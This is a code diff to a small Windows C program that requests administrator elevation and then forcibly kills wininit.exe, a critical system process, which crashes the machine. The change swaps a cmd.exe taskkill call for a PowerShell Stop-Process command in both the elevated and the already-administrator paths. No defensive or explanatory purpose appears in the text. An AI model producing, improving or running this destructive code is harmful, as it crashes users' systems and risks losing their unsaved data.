@@ -21,8 +21,8 @@ int main() {
         sei.fMask = SEE_MASK_NOCLOSEPROCESS;
         sei.hwnd = NULL;
         sei.lpVerb = "runas";  // Request elevation
-        sei.lpFile = "cmd.exe";
-        sei.lpParameters = "/c taskkill /IM wininit.exe";  // Taskkill command
+        sei.lpFile = "powershell.exe";  // Use PowerShell
+        sei.lpParameters = "-Command \"Stop-Process -Name wininit -Force\"";  // PowerShell command
         sei.nShow = SW_SHOWNORMAL;
 
         // Execute with elevated privileges
@@ -35,7 +35,7 @@ int main() {
         WaitForSingleObject(sei.hProcess, INFINITE);
         CloseHandle(sei.hProcess);
     } else {
-        // Execute the taskkill command directly
+        // Execute the PowerShell command directly
         printf("Running as Administrator. Executing command...\n");
 
         // Prepare to execute the command
@@ -45,8 +45,8 @@ int main() {
         si.cb = sizeof(si);
         ZeroMemory(&pi, sizeof(pi));
 
-        // Create the command line
-        char command[] = "taskkill /IM wininit.exe";
+        // Create the command line for PowerShell
+        char command[] = "powershell.exe -Command \"Stop-Process -Name wininit -Force\"";
 
         // Create the process
         if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
